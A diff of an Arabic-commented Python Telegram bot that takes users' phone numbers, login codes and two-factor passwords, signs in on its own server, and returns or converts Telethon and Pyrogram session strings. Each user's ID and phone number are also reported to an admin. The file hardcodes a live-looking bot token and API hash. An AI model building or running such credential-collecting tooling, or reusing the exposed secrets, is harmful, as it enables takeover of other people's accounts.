@@ -8,7 +8,10 @@ from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneNumber
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
 
 # ========== الإعدادات - عدل دي ==========
 TOKEN = "8917859065:AAH0RlZ87TeAPk1D0qI0DPtZNOhAa8KlvjQ" # حط التوكن بتاعك هنا
@@ -17,6 +20,8 @@ API_ID = 37879014    # حط api_id بتاعك
 API_HASH = "db129fe3286650ad869b2891abd72df2" # حط api_hash بتاعك
 DEV_USERNAME = "aabdulrahmaan"
 DEVICE_NAME = "iPhone 17 pro"
+
+app = None
 
 # ========== قاعدة البيانات ==========
 async def init_db():
@@ -61,7 +66,8 @@ async def log_session(user_id, phone, session_type):
     if ADMIN_ID:
         try:
             await app.bot.send_message(ADMIN_ID, f"🔐 <b>نسخة احتياطية</b>\n\n👤 <code>{user_id}</code>\n📱 <code>{phone}</code>\n⚙️ {session_type}", parse_mode='HTML')
-        except: pass
+        except Exception as e:
+            print(f"Error sending to admin: {e}")
 
 # ========== الرسائل ==========
 WELCOME_MSG = """
@@ -95,207 +101,190 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard.append([InlineKeyboardButton("⚙️ لوحة الأدمن", callback_data="admin_panel")])
     await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
 
-# ========== استخراج تليثون ==========
+# ========== Handle Messages ==========
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     username = update.effective_user.username
-    text = update.message.text
+    text = update.message.text.strip()
     state, temp_data = await get_user_state(user_id)
 
     print(f"Message from {user_id}: state={state}, text={text}")
 
+    # استخراج تليثون
     if state == "waiting_phone_telethon":
-        phone = text.strip()
-        await update.message.reply_text("⏳ جاري إرسال الكود...")
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        phone = text
+        msg = await update.message.reply_text("⏳ جاري إرسال الكود...")
+        client = TelegramClient(StringSession(), API_ID, API_HASH, device_model=DEVICE_NAME)
         try:
             await client.connect()
             sent = await client.send_code_request(phone)
             temp_data = {"phone": phone, "phone_code_hash": sent.phone_code_hash, "session": client.session.save()}
             await set_user_state(user_id, username, "waiting_code_telethon", temp_data)
-            await update.message.reply_text("📩 تم إرسال الكود، ابعته هنا:\n\nمثال: `12345`", parse_mode='Markdown')
+            await msg.edit_text("📩 تم إرسال الكود، ابعته هنا:\n\nمثال: `12345`", parse_mode='Markdown')
         except PhoneNumberInvalidError:
-            await update.message.reply_text("❌ رقم الهاتف غير صحيح")
+            await msg.edit_text("❌ رقم الهاتف غير صحيح")
             await set_user_state(user_id, username, None)
         except Exception as e:
-            await update.message.reply_text(f"❌ خطأ: {e}")
+            await msg.edit_text(f"❌ خطأ: {e}")
             await set_user_state(user_id, username, None)
         finally:
             await client.disconnect()
 
     elif state == "waiting_code_telethon":
-        code = text.strip()
+        code = text
         phone = temp_data.get("phone")
         phone_code_hash = temp_data.get("phone_code_hash")
         session = temp_data.get("session")
-
-        client = TelegramClient(StringSession(session), API_ID, API_HASH)
+        msg = await update.message.reply_text("⏳ جاري تسجيل الدخول...")
+        client = TelegramClient(StringSession(session), API_ID, API_HASH, device_model=DEVICE_NAME)
         try:
             await client.connect()
             await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
             session_string = client.session.save()
-            await update.message.reply_text(f"✅ <b>تم استخراج الجلسة بنجاح</b>\n\n<code>{session_string}</code>\n\n⚠️ لا تشاركها مع احد", parse_mode='HTML')
+            await msg.edit_text(f"✅ <b>تم استخراج الجلسة بنجاح</b>\n\n<code>{session_string}</code>\n\n⚠️ لا تشاركها مع احد", parse_mode='HTML')
             await log_session(user_id, phone, "Telethon")
             await set_user_state(user_id, username, None)
         except SessionPasswordNeededError:
             temp_data["session"] = client.session.save()
             await set_user_state(user_id, username, "waiting_password_telethon", temp_data)
-            await update.message.reply_text("🔐 الحساب محمي بكلمة مرور ثنائية، ابعتها هنا:")
+            await msg.edit_text("🔐 الحساب محمي بكلمة مرور ثنائية، ابعتها هنا:")
         except PhoneCodeInvalidError:
-            await update.message.reply_text("❌ الكود غير صحيح، حاول تاني:")
+            await msg.edit_text("❌ الكود غير صحيح، حاول تاني:")
         except Exception as e:
-            await update.message.reply_text(f"❌ خطأ: {e}")
+            await msg.edit_text(f"❌ خطأ: {e}")
             await set_user_state(user_id, username, None)
         finally:
             await client.disconnect()
 
     elif state == "waiting_password_telethon":
-        password = text.strip()
+        password = text
         phone = temp_data.get("phone")
         session = temp_data.get("session")
-
-        client = TelegramClient(StringSession(session), API_ID, API_HASH)
+        msg = await update.message.reply_text("⏳ جاري التحقق...")
+        client = TelegramClient(StringSession(session), API_ID, API_HASH, device_model=DEVICE_NAME)
         try:
             await client.connect()
             await client.sign_in(password=password)
             session_string = client.session.save()
-            await update.message.reply_text(f"✅ <b>تم استخراج الجلسة بنجاح</b>\n\n<code>{session_string}</code>\n\n⚠️ لا تشاركها مع احد", parse_mode='HTML')
+            await msg.edit_text(f"✅ <b>تم استخراج الجلسة بنجاح</b>\n\n<code>{session_string}</code>\n\n⚠️ لا تشاركها مع احد", parse_mode='HTML')
             await log_session(user_id, phone, "Telethon")
             await set_user_state(user_id, username, None)
         except Exception as e:
-            await update.message.reply_text(f"❌ كلمة المرور غلط: {e}")
+            await msg.edit_text(f"❌ كلمة المرور غلط: {e}")
         finally:
             await client.disconnect()
 
-    # ========== استخراج بايوجرام ==========
+    # استخراج بايوجرام
     elif state == "waiting_phone_pyro":
-        phone = text.strip()
-        await update.message.reply_text("⏳ جاري إرسال الكود...")
-        client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
+        phone = text
+        msg = await update.message.reply_text("⏳ جاري إرسال الكود...")
+        client = Client(":memory:", api_id=API_ID, api_hash=API_HASH, device_model=DEVICE_NAME)
         try:
             await client.connect()
             sent = await client.send_code(phone)
-            temp_data = {"phone": phone, "phone_code_hash": sent.phone_code_hash, "session": await client.export_session_string()}
+            temp_data = {"phone": phone, "phone_code_hash": sent.phone_code_hash}
             await set_user_state(user_id, username, "waiting_code_pyro", temp_data)
-            await update.message.reply_text("📩 تم إرسال الكود، ابعته هنا:")
+            await msg.edit_text("📩 تم إرسال الكود، ابعته هنا:")
         except PhoneNumberInvalid:
-            await update.message.reply_text("❌ رقم الهاتف غير صحيح")
+            await msg.edit_text("❌ رقم الهاتف غير صحيح")
             await set_user_state(user_id, username, None)
         except Exception as e:
-            await update.message.reply_text(f"❌ خطأ: {e}")
+            await msg.edit_text(f"❌ خطأ: {e}")
             await set_user_state(user_id, username, None)
         finally:
             await client.disconnect()
 
     elif state == "waiting_code_pyro":
-        code = text.strip()
+        code = text
         phone = temp_data.get("phone")
         phone_code_hash = temp_data.get("phone_code_hash")
-
-        client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
+        msg = await update.message.reply_text("⏳ جاري تسجيل الدخول...")
+        client = Client(":memory:", api_id=API_ID, api_hash=API_HASH, device_model=DEVICE_NAME)
         try:
             await client.connect()
             await client.sign_in(phone_number=phone, phone_code_hash=phone_code_hash, phone_code=code)
             session_string = await client.export_session_string()
-            await update.message.reply_text(f"✅ <b>تم استخراج الجلسة بنجاح</b>\n\n<code>{session_string}</code>\n\n⚠️ لا تشاركها مع احد", parse_mode='HTML')
+            await msg.edit_text(f"✅ <b>تم استخراج الجلسة بنجاح</b>\n\n<code>{session_string}</code>\n\n⚠️ لا تشاركها مع احد", parse_mode='HTML')
             await log_session(user_id, phone, "Pyrogram")
             await set_user_state(user_id, username, None)
         except SessionPasswordNeeded:
-            await set_user_state(user_id, username, "waiting_password_pyro", {"phone": phone, "session": await client.export_session_string()})
-            await update.message.reply_text("🔐 الحساب محمي بكلمة مرور ثنائية، ابعتها هنا:")
+            await set_user_state(user_id, username, "waiting_password_pyro", {"phone": phone})
+            await msg.edit_text("🔐 الحساب محمي بكلمة مرور ثنائية، ابعتها هنا:")
         except PhoneCodeInvalid:
-            await update.message.reply_text("❌ الكود غير صحيح، حاول تاني:")
+            await msg.edit_text("❌ الكود غير صحيح، حاول تاني:")
         except Exception as e:
-            await update.message.reply_text(f"❌ خطأ: {e}")
+            await msg.edit_text(f"❌ خطأ: {e}")
             await set_user_state(user_id, username, None)
         finally:
             await client.disconnect()
 
     elif state == "waiting_password_pyro":
-        password = text.strip()
+        password = text
         phone = temp_data.get("phone")
-        session = temp_data.get("session")
-
-        client = Client(":memory:", api_id=API_ID, api_hash=API_HASH, session_string=session)
+        msg = await update.message.reply_text("⏳ جاري التحقق...")
+        client = Client(":memory:", api_id=API_ID, api_hash=API_HASH, device_model=DEVICE_NAME)
         try:
             await client.connect()
             await client.check_password(password)
             session_string = await client.export_session_string()
-            await update.message.reply_text(f"✅ <b>تم استخراج الجلسة بنجاح</b>\n\n<code>{session_string}</code>\n\n⚠️ لا تشاركها مع احد", parse_mode='HTML')
+            await msg.edit_text(f"✅ <b>تم استخراج الجلسة بنجاح</b>\n\n<code>{session_string}</code>\n\n⚠️ لا تشاركها مع احد", parse_mode='HTML')
             await log_session(user_id, phone, "Pyrogram")
             await set_user_state(user_id, username, None)
         except Exception as e:
-            await update.message.reply_text(f"❌ كلمة المرور غلط: {e}")
+            await msg.edit_text(f"❌ كلمة المرور غلط: {e}")
         finally:
             await client.disconnect()
 
-    # ========== التحويل ==========
+    # تحويل تليثون -> بايوجرام
     elif state == "waiting_session_tele_to_pyro":
-        telethon_session = text.strip()
-        await update.message.reply_text("⏳ جاري التحويل...")
+        telethon_session = text
+        msg = await update.message.reply_text("⏳ جاري التحويل...")
         try:
             t_client = TelegramClient(StringSession(telethon_session), API_ID, API_HASH)
             await t_client.connect()
             if not await t_client.is_user_authorized():
-                await update.message.reply_text("❌ الجلسة غير صالحة")
+                await msg.edit_text("❌ الجلسة غير صالحة او منتهية")
                 await t_client.disconnect()
                 return
+
             me = await t_client.get_me()
             phone = me.phone
-            # خد الداتا قبل ما تقفل الكلاينت
-            dc_id = t_client.session.dc_id
-            auth_key = t_client.session.auth_key
-            user_id = me.id
-            is_bot = me.bot
+
+            # الطريقة الصح للتحويل
+            from pyrogram import Client as PyroClient
+            from pyrogram.storage import MemoryStorage
+
+            storage = MemoryStorage()
+            await storage.dc_id(t_client.session.dc_id)
+            await storage.auth_key(t_client.session.auth_key)
+            await storage.user_id(me.id)
+            await storage.is_bot(me.bot)
+            await storage.date(int(datetime.now().timestamp()))
+
+            p_client = PyroClient(":memory:", api_id=API_ID, api_hash=API_HASH, storage=storage)
+            await p_client.connect()
+            pyro_session = await p_client.export_session_string()
+            await p_client.disconnect()
             await t_client.disconnect()
 
-            p_client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
-            await p_client.connect()
-            # التعديل هنا: شيلنا await
-            await p_client.storage.set_dc(dc_id)
-            await p_client.storage.set_auth_key(auth_key)
-            await p_client.storage.set_user_id(user_id)
-            await p_client.storage.set_is_bot(is_bot)
-            pyro_session = await p_client.export_session_string()
-            await p_client.disconnect()
-
-            await update.message.reply_text(f"✅ <b>تم التحويل بنجاح</b>\n\n<code>{pyro_session}</code>", parse_mode='HTML')
+            await msg.edit_text(f"✅ <b>تم التحويل بنجاح</b>\n\n<code>{pyro_session}</code>", parse_mode='HTML')
             await log_session(user_id, phone, "Telethon → Pyrogram")
             await set_user_state(user_id, username, None)
         except Exception as e:
-            await update.message.reply_text(f"❌ خطأ في التحويل: {e}")
+            await msg.edit_text(f"❌ خطأ في التحويل: {e}")
             await set_user_state(user_id, username, None)
 
-            p_client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
-            await p_client.connect()
-            await p_client.storage.dc_id = t_client.session.dc_id
-            await p_client.storage.auth_key = t_client.session.auth_key
-            await p_client.storage.user_id = me.id
-            await p_client.storage.is_bot = me.bot
-            pyro_session = await p_client.export_session_string()
-            await p_client.disconnect()
-
-            await update.message.reply_text(f"✅ <b>تم التحويل بنجاح</b>\n\n<code>{pyro_session}</code>", parse_mode='HTML')
-            await log_session(user_id, phone, "Telethon → Pyrogram")
-            await set_user_state(user_id, username, None)
-        except Exception as e:
-            await update.message.reply_text(f"❌ خطأ في التحويل: {e}")
-            await set_user_state(user_id, username, None)
-
+    # تحويل بايوجرام -> تليثون
     elif state == "waiting_session_pyro_to_tele":
-        pyro_session = text.strip()
-        await update.message.reply_text("⏳ جاري التحويل...")
+        pyro_session = text
+        msg = await update.message.reply_text("⏳ جاري التحويل...")
         try:
             p_client = Client(":memory:", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session)
             await p_client.connect()
-            if not await p_client.is_initialized:
-                await update.message.reply_text("❌ الجلسة غير صالحة")
-                await p_client.disconnect()
-                return
             me = await p_client.get_me()
             phone = me.phone
-            dc_id = await p_client.storage.dc_id
-            auth_key = await p_client.storage.auth_key
+            dc_id = await p_client.storage.dc_id()
+            auth_key = await p_client.storage.auth_key()
             await p_client.disconnect()
 
             t_client = TelegramClient(StringSession(), API_ID, API_HASH)
@@ -305,11 +294,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             telethon_session = t_client.session.save()
             await t_client.disconnect()
 
-            await update.message.reply_text(f"✅ <b>تم التحويل بنجاح</b>\n\n<code>{telethon_session}</code>", parse_mode='HTML')
+            await msg.edit_text(f"✅ <b>تم التحويل بنجاح</b>\n\n<code>{telethon_session}</code>", parse_mode='HTML')
             await log_session(user_id, phone, "Pyrogram → Telethon")
             await set_user_state(user_id, username, None)
         except Exception as e:
-            await update.message.reply_text(f"❌ خطأ في التحويل: {e}")
+            await msg.edit_text(f"❌ خطأ في التحويل: {e}")
             await set_user_state(user_id, username, None)
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -339,8 +328,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.message.reply_text(f"⚙️ <b>لوحة الأدمن</b>\n\n👥 المستخدمين: {total_users}\n🔐 الجلسات المستخرجة: {total_sessions}", parse_mode='HTML')
 
 # ========== تشغيل البوت ==========
-app = None
-
 async def main():
     global app
     print("Bot Started...")
